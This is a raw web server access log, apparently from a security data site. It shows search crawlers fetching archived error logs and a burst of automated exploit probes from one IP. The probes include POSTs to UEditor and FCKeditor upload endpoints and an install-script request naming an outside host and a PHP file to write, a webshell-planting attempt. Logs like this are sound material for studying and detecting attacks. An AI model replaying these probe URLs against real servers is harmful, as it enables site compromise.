51.222.253.10 - - [06/Feb/2024:02:26:47 -0800] "GET /self.logs/2016/error.log.2016-12-05.gz HTTP/1.1" 200 906 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.16 - - [06/Feb/2024:02:31:42 -0800] "GET /self.logs/2015/error.log.2015-11-21.gz HTTP/1.1" 200 1057 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
52.167.144.140 - - [06/Feb/2024:02:31:45 -0800] "GET /self.logs/error.log.2019-12-05.gz HTTP/1.1" 200 1082 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.12 - - [06/Feb/2024:02:36:19 -0800] "GET /self.logs/2016/error.log.2016-05-25.gz HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
40.77.167.52 - - [06/Feb/2024:02:38:12 -0800] "GET /self.logs/error.log.2017-02-05.gz HTTP/1.1" 200 1347 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.16 - - [06/Feb/2024:02:41:08 -0800] "GET /self.logs/2016/error.log.2016-01-27.gz HTTP/1.1" 200 790 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
23.224.196.156 - - [06/Feb/2024:02:45:59 -0800] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 284 "http://www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
23.224.196.156 - - [06/Feb/2024:02:45:59 -0800] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=tufvv.php&updateHost=http://www.o64.cc/ HTTP/1.1" 404 328 "http://www.secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=tufvv.php&updateHost=http://www.o64.cc/" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0" 
23.224.196.156 - - [06/Feb/2024:02:45:59 -0800] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; fr; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.0.04506.648)" 
23.224.196.156 - - [06/Feb/2024:02:45:59 -0800] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 250 "http://www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
23.224.196.156 - - [06/Feb/2024:02:46:00 -0800] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 305 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9b4) Gecko/2008030714 Firefox/3.0b4" 
